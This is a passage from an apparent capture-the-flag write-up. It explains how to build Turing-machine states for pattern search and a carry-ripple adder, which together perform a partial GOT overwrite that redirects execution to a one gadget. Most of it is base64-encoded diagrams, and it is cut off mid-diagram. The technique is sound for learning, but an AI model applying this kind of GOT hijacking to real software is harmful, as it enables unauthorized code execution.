L3RleHQ+CjwvZz4KPCEtLSBxNCYjNDU7Jmd0O3EwIC0tPgo8ZyBpZD0iZWRnZTkiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnE0LSZndDtxMDwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik01NDguOTIsLTEzLjJDNTIxLjg3LC04LjQ5IDQ3Ny42NCwtMiA0MzkuMTYsLTIgMTYzLjA1LC0yIDE2My4wNSwtMiAxNjMuMDUsLTIgMTE1LjMsLTIgNzEuNzcsLTQxLjYxIDQ3LjY4LC02OC41NyIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI0NS4xNCwtNjYuMTUgNDEuMjYsLTc2IDUwLjQ0LC03MC43MiA0NS4xNCwtNjYuMTUiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMzAxLjEiIHk9Ii02LjIiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MCDihpIgMCwgTDwvdGV4dD4KPC9nPgo8IS0tIHE1IC0tPgo8ZyBpZD0ibm9kZTYiIGNsYXNzPSJub2RlIj4KPHRpdGxlPnE1PC90aXRsZT4KPGVsbGlwc2UgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgY3g9IjcxMi4yNiIgY3k9Ii0xOCIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iNzEyLjI2IiB5PSItMTMuOCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xNTwvdGV4dD4KPC9nPgo8IS0tIHE0JiM0NTsmZ3Q7cTUgLS0+CjxnIGlkPSJlZGdlMTAiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnE0LSZndDtxNTwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik02MDIuNTcsLTE4QzYyMi44MywtMTggNjUxLjA5LC0xOCA2NzMuNzIsLTE4Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjY3My40NSwtMjEuNSA2ODMuNDUsLTE4IDY3My40NSwtMTQuNSA2NzMuNDUsLTIxLjUiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iNjQzLjczIiB5PSItMjIuMiIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBMPC90ZXh0Pgo8L2c+CjwvZz4KPC9zdmc+">
<figcaption>Naive &amp; wrong search_for construction</figcaption>
</figure>
<h5 id="correct-search_for-construction">Correct search_for construction </h5>
<p>To fix that issue, we look for the longest suffix in the already parsed value which is a prefix to the value. In the above example, that would be the <code>0b10</code> (suffix from <code>0b1010</code> and prefix of <code>0b10111</code>). The corresponding transitions then are:  <code>[(0, L, bit == 0 ? (k + 1) : prefix_len), (0, L, bit == 0 ? (k + 1) : prefix_len)]</code></p>
<p>You can see a diagram for the correct construction below. There is also the aforementioned transition from <code>q3</code> to <code>q2</code> instead of <code>q0</code> when reading a <code>0</code> from the tape.</p>
<figure>
<img src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iNzQ3cHQiIGhlaWdodD0iMTMzcHQiIHZpZXdCb3g9IjAuMDAgMC4wMCA3NDcuMjYgMTMyLjgwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KPGcgaWQ9ImdyYXBoMCIgY2xhc3M9ImdyYXBoIiB0cmFuc2Zvcm09InNjYWxlKDEgMSkgcm90YXRlKDApIHRyYW5zbGF0ZSg0IDEyOC44KSI+Cjx0aXRsZT5UdXJpbmdNYWNoaW5lPC90aXRsZT4KPHBvbHlnb24gZmlsbD0id2hpdGUiIHN0cm9rZT0ibm9uZSIgcG9pbnRzPSItNCw0IC00LC0xMjguOCA3NDMuMjYsLTEyOC44IDc0My4yNiw0IC00LDQiLz4KPCEtLSBxMCAtLT4KPGcgaWQ9Im5vZGUxIiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMDwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSIyNyIgY3k9Ii0zNSIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMjciIHk9Ii0zMC44IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnEwPC90ZXh0Pgo8L2c+CjwhLS0gcTAmIzQ1OyZndDtxMCAtLT4KPGcgaWQ9ImVkZ2UxIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMC0mZ3Q7cTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTUuMDYsLTUxLjI5QzEyLjE4LC02MS4zOSAxNi4xNiwtNzEgMjcsLTcxIDMzLjQ0LC03MSAzNy40NiwtNjcuNjEgMzkuMDUsLTYyLjc0Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjQyLjU2LC02Mi43NyAzOC45NiwtNTIuOCAzNS41NiwtNjIuODQgNDIuNTYsLTYyLjc3Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjI3IiB5PSItNzUuMiIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAwLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTEgLS0+CjxnIGlkPSJub2RlMiIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTE8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iMTY0LjA1IiBjeT0iLTcyIiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIxNjQuMDUiIHk9Ii02Ny44IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnExPC90ZXh0Pgo8L2c+CjwhLS0gcTAmIzQ1OyZndDtxMSAtLT4KPGcgaWQ9ImVkZ2UyIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMC0mZ3Q7cTE8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNNTIuNDYsLTQxLjdDNzMuNDksLTQ3LjQ2IDEwNC4wOSwtNTUuODUgMTI3Ljc4LC02Mi4zNCIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSIxMjYuNzUsLTY1LjY4IDEzNy4zMiwtNjQuOTUgMTI4LjYsLTU4LjkzIDEyNi43NSwtNjUuNjgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iOTUuNTMiIHk9Ii02My4xOCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTEmIzQ1OyZndDtxMSAtLT4KPGcgaWQ9ImVkZ2U0IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMS0mZ3Q7cTE8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTUyLjExLC04OC4yOUMxNDkuMjMsLTk4LjM5IDE1My4yMSwtMTA4IDE2NC4wNSwtMTA4IDE3MC40OSwtMTA4IDE3NC41MSwtMTA0LjYxIDE3Ni4xMSwtOTkuNzQiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMTc5LjYxLC05OS43NyAxNzYuMDEsLTg5LjggMTcyLjYxLC05OS44NCAxNzkuNjEsLTk5Ljc3Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjE2NC4wNSIgeT0iLTExMi4yIiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDEsIEw8L3RleHQ+CjwvZz4KPCEtLSBxMiAtLT4KPGcgaWQ9Im5vZGUzIiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMjwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSIzMDEuMSIgY3k9Ii0zNSIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMzAxLjEiIHk9Ii0zMC44IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnEyPC90ZXh0Pgo8L2c+CjwhLS0gcTEmIzQ1OyZndDtxMiAtLT4KPGcgaWQ9ImVkZ2UzIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMS0mZ3Q7cTI8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTg5LjUxLC02NS4zQzIxMC41NCwtNTkuNTQgMjQxLjE1LC01MS4xNSAyNjQuODMsLTQ0LjY2Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjI2NS42NSwtNDguMDcgMjc0LjM3LC00Mi4wNSAyNjMuOCwtNDEuMzIgMjY1LjY1LC00OC4wNyIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIyMzIuNTgiIHk9Ii02My4xOCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAwLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTImIzQ1OyZndDtxMCAtLT4KPGcgaWQ9ImVkZ2U1IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMi0mZ3Q7cTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMjc0LjEyLC0zMi45MkMyNTIuMDQsLTMxLjI3IDIxOS40OSwtMjkuMDkgMTkxLjA1LC0yOC4yIDE2Ny4wNiwtMjcuNDUgMTYxLjA0LC0yNy40NSAxMzcuMDUsLTI4LjIgMTEzLjE3LC0yOC45NCA4Ni4zOCwtMzAuNiA2NS4zMywtMzIuMSIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI2NS4yMSwtMjguNTkgNTUuNDksLTMyLjgxIDY1LjcyLC0zNS41OCA2NS4yMSwtMjguNTkiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMTY0LjA1IiB5PSItMzIuNCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAwLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTMgLS0+CjxnIGlkPSJub2RlNCIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTM8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iNDM4LjE2IiBjeT0iLTU1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI0MzguMTYiIHk9Ii01MC44IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnEzPC90ZXh0Pgo8L2c+CjwhLS0gcTImIzQ1OyZndDtxMyAtLT4KPGcgaWQ9ImVkZ2U2IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMi0mZ3Q7cTM8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMzIzLjU0LC00NS42QzMzMC41NiwtNDguNTcgMzM4LjUxLC01MS40MiAzNDYuMSwtNTMgMzYzLjQyLC01Ni42IDM4Mi45OCwtNTcuNDQgMzk5LjUzLC01Ny4yNCIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSIzOTkuNTUsLTYwLjc0IDQwOS40NSwtNTYuOTcgMzk5LjM2LC01My43NCAzOTkuNTUsLTYwLjc0Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjM2OS42MyIgeT0iLTYxLjQ2IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDEsIEw8L3RleHQ+CjwvZz4KPCEtLSBxMyYjNDU7Jmd0O3EyIC0tPgo8ZyBpZD0iZWRnZTciIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnEzLSZndDtxMjwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik00MTguMjMsLTQyLjY3QzQxMC43NCwtMzguNDggNDAxLjg1LC0zNC4zMiAzOTMuMTYsLTMyLjIgMzc1LjU1LC0yNy45MSAzNTUuNDcsLTI4LjAyIDMzOC42NSwtMjkuNDUiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMzM4LjY5LC0yNS45MyAzMjkuMTEsLTMwLjQ2IDMzOS40MiwtMzIuODkgMzM4LjY5LC0yNS45MyIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIzNjkuNjMiIHk9Ii0zNi40IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjAg4oaSIDAsIEw8L3RleHQ+CjwvZz4KPCEtLSBxNCAtLT4KPGcgaWQ9Im5vZGU1IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xNDwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSI1NzUuMjEiIGN5PSItMTgiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjU3NS4yMSIgeT0iLTEzLjgiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTQ8L3RleHQ+CjwvZz4KPCEtLSBxMyYjNDU7Jmd0O3E0IC0tPgo8ZyBpZD0iZWRnZTgiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnEzLSZndDtxNDwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik00NjMuNjEsLTQ4LjNDNDg0LjY1LC00Mi41NCA1MTUuMjUsLTM0LjE1IDUzOC45MywtMjcuNjYiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNTM5Ljc1LC0zMS4wNyA1NDguNDcsLTI1LjA1IDUzNy45LC0yNC4zMiA1MzkuNzUsLTMxLjA3Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjUwNi42OCIgeT0iLTQ2LjE4IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDEsIEw8L3RleHQ+CjwvZz4KPCEtLSBxNCYjNDU7Jmd0O3EyIC0tPgo8ZyBpZD0iZWRnZTkiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnE0LSZndDtxMjwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik01NDguMjMsLTE1LjkyQzUyNi4xNSwtMTQuMjcgNDkzLjYsLTEyLjA5IDQ2NS4xNiwtMTEuMiA0NDEuMTcsLTEwLjQ1IDQzNS4wMiwtOC43IDQxMS4xNiwtMTEuMiAzODEuNzYsLTE0LjI4IDM3NC45NywtMTguNjYgMzQ2LjEsLTI1IDM0My41MiwtMjUuNTcgMzQwLjg2LC0yNi4xNiAzMzguMTcsLTI2Ljc2Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjMzNy42OCwtMjMuMjggMzI4LjcsLTI4Ljg5IDMzOS4yMiwtMzAuMTEgMzM3LjY4LC0yMy4yOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI0MzguMTYiIHk9Ii0xNS40IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjAg4oaSIDAsIEw8L3RleHQ+CjwvZz4KPCEtLSBxNSAtLT4KPGcgaWQ9Im5vZGU2IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xNTwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSI3MTIuMjYiIGN5PSItMTgiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjcxMi4yNiIgeT0iLTEzLjgiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTU8L3RleHQ+CjwvZz4KPCEtLSBxNCYjNDU7Jmd0O3E1IC0tPgo8ZyBpZD0iZWRnZTEwIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xNC0mZ3Q7cTU8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNNjAyLjU3LC0xOEM2MjIuODMsLTE4IDY1MS4wOSwtMTggNjczLjcyLC0xOCIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI2NzMuNDUsLTIxLjUgNjgzLjQ1LC0xOCA2NzMuNDUsLTE0LjUgNjczLjQ1LC0yMS41Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjY0My43MyIgeT0iLTIyLjIiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MSDihpIgMSwgTDwvdGV4dD4KPC9nPgo8L2c+Cjwvc3ZnPg==">
<figcaption>Correct search_for construction</figcaption>
</figure>
<h3 id="partial-got-overwrite">Partial GOT Overwrite </h3>
<p>To change the address in the GOT to our one gadget, we need to add a certain value. It might not be immediately obvious on how to do that, but a simple Carry-Ripple-Adder is the solution. By the nature of addition, the operation moves towards the right over the tape.</p>
<p>Let added value have a length of <code>l</code>. Then we have <code>l</code> states to represent the addition of bit <code>k</code> without carry and <code>l</code> states represent the addition of bit <code>k + 1</code> with carry.</p>
<p>Because we cannot have a carry for position <code>0</code>, that state does not exists. But as we can have a carry, for position <code>l</code> there are still <code>l</code> carry states.</p>
<p>The table below shows the states in use and the meaning assigned to them. Their function and transitions are explained below.</p>
<table>
<thead>
<tr>
<th>State Index</th>
<th>Assignment</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[0, .., l - 1]</code></td>
<td>non-carry states</td>
</tr>
<tr>
<td><code>l</code></td>
<td>final-state for non-carry route</td>
</tr>
<tr>
<td><code>[l + 1, .., 2*l - 1]</code></td>
<td>carry-states</td>
</tr>
<tr>
<td><code>2*l</code></td>
<td>infinite carry</td>
</tr>
<tr>
<td><code>2*l + 1</code></td>
<td>final state</td>
</tr>
</tbody>
</table>
<p>For every non-carry state <code>k</code>, the transitions are: <code>[(bit, R, k + 1), (bit ^ 1, R, (bit == 1) ? (l + k + 1) : (k + 1))]</code>. So, if we read a zero bit, we just put down the bit at position <code>k</code> of our value. If we read a one, we put down the inverse (<code>^</code> is xor) of the bit because that's the result of addition with 1 modulo two. We transition to the carry-state <code>k</code> if <code>bit == 1</code>, else continue with the next non-carry state.</p>
<p>The final-state for the non-carries just transitions unconditionally to the final state.</p>
<p>For every non-carry state <code>0 &lt; j &lt; l</code>, the transitions are: <code>[(bit ^ 1, R, (bit == 0) ? (j + 1) : (l + j + 1)), (bit, R, l + j + 1)]</code>. When reading a <code>1</code>, we transition to the next carry state and put down the bit. When the tape contains a <code>0</code> at that position, we put down the inverse and transition to non-carry state <code>j</code> if <code>bit == 0</code>, else to the carry state <code>j</code>.</p>
<p>The carry state <code>l</code> has the following transitions: <code>[(1, R, 2 * l + 1), (0, R, 2 * l)]</code>. It performs the carry, as long as there are ones on the tape, and afterward transitions to the final state.</p>
<p>For example, adding <code>0x8b = 0b10001011</code> (notice: <code>l = 8</code>) results in the following state diagram.</p>
<figure>
<img src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iMTMwM3B0IiBoZWlnaHQ9IjE4NXB0IiB2aWV3Qm94PSIwLjAwIDAuMDAgMTMwMi41NCAxODUuMzQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgo8ZyBpZD0iZ3JhcGgwIiBjbGFzcz0iZ3JhcGgiIHRyYW5zZm9ybT0ic2NhbGUoMSAxKSByb3RhdGUoMCkgdHJhbnNsYXRlKDQgMTgxLjM0KSI+Cjx0aXRsZT5UdXJpbmdNYWNoaW5lPC90aXRsZT4KPHBvbHlnb24gZmlsbD0id2hpdGUiIHN0cm9rZT0ibm9uZSIgcG9pbnRzPSItNCw0IC00LC0xODEuMzQgMTI5OC41NCwtMTgxLjM0IDEyOTguNTQsNCAtNCw0Ii8+CjwhLS0gcTAgLS0+CjxnIGlkPSJub2RlMSIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTA8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iMjciIGN5PSItOTguMjUiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjI3IiB5PSItOTQuMDUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTA8L3RleHQ+CjwvZz4KPCEtLSBxMSAtLT4KPGcgaWQ9Im5vZGUyIiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMTwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSIxNjQuODQiIGN5PSItMTI1LjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIxNjQuODQiIHk9Ii0xMjEuMDUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTE8L3RleHQ+CjwvZz4KPCEtLSBxMCYjNDU7Jmd0O3ExIC0tPgo8ZyBpZD0iZWRnZTEiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnEwLSZndDtxMTwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik01My4yMywtMTAzLjI2Qzc0LjEsLTEwNy40MSAxMDQuMDIsLTExMy4zNiAxMjcuNDgsLTExOC4wMiIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSIxMjYuNzcsLTEyMS40NSAxMzcuMjYsLTExOS45NiAxMjguMTMsLTExNC41OCAxMjYuNzcsLTEyMS40NSIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI5NS45MiIgeT0iLTExOS45NCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTkgLS0+CjxnIGlkPSJub2RlMyIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTk8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iMTY0Ljg0IiBjeT0iLTcxLjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIxNjQuODQiIHk9Ii02Ny4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xOTwvdGV4dD4KPC9nPgo8IS0tIHEwJiM0NTsmZ3Q7cTkgLS0+CjxnIGlkPSJlZGdlMiIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTAtJmd0O3E5PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTUyLjYsLTkxLjkxQzU4LjkxLC05MC4zNiA2NS42OSwtODguNzggNzIsLTg3LjQ1IDkwLjAyLC04My42NSAxMTAuMTYsLTgwLjAzIDEyNi45NywtNzcuMTgiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMTI3LjI0LC04MC42OCAxMzYuNTMsLTc1LjU4IDEyNi4wOSwtNzMuNzggMTI3LjI0LC04MC42OCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI5NS45MiIgeT0iLTkxLjY1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxMiAtLT4KPGcgaWQ9Im5vZGU0IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMjwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSIzMDIuNjgiIGN5PSItMTU4LjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIzMDIuNjgiIHk9Ii0xNTQuMDUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTI8L3RleHQ+CjwvZz4KPCEtLSBxMSYjNDU7Jmd0O3EyIC0tPgo8ZyBpZD0iZWRnZTMiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnExLSZndDtxMjwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik0xOTAuNDksLTEzMS40NkMxOTYuOCwtMTMzLjAzIDIwMy41NywtMTM0LjcxIDIwOS44NCwtMTM2LjI1IDIyOC4yMSwtMTQwLjc1IDI0OC42OCwtMTQ1LjY2IDI2NS42MiwtMTQ5LjciLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMjY0LjcsLTE1My4wOCAyNzUuMjQsLTE1MS45OSAyNjYuMzIsLTE0Ni4yNyAyNjQuNywtMTUzLjA4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjIzMy43NiIgeT0iLTE1MS45NCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTEwIC0tPgo8ZyBpZD0ibm9kZTUiIGNsYXNzPSJub2RlIj4KPHRpdGxlPnExMDwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSIzMDIuNjgiIGN5PSItNzguMjUiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjMwMi42OCIgeT0iLTc0LjA1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnExMDwvdGV4dD4KPC9nPgo8IS0tIHExJiM0NTsmZ3Q7cTEwIC0tPgo8ZyBpZD0iZWRnZTQiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnExLSZndDtxMTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTkwLjE5LC0xMTguMTZDMjA4LjgxLC0xMTIuNTkgMjM1LjAzLC0xMDQuNDQgMjU3LjY4LC05Ni4yNSAyNjEuMzYsLTk0LjkyIDI2NS4xOSwtOTMuNDYgMjY4Ljk4LC05MS45NyIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSIyNzAuMDYsLTk1LjMxIDI3OC4wMywtODguMzMgMjY3LjQ0LC04OC44MiAyNzAuMDYsLTk1LjMxIi8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjIzMy43NiIgeT0iLTExNi4yMSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlc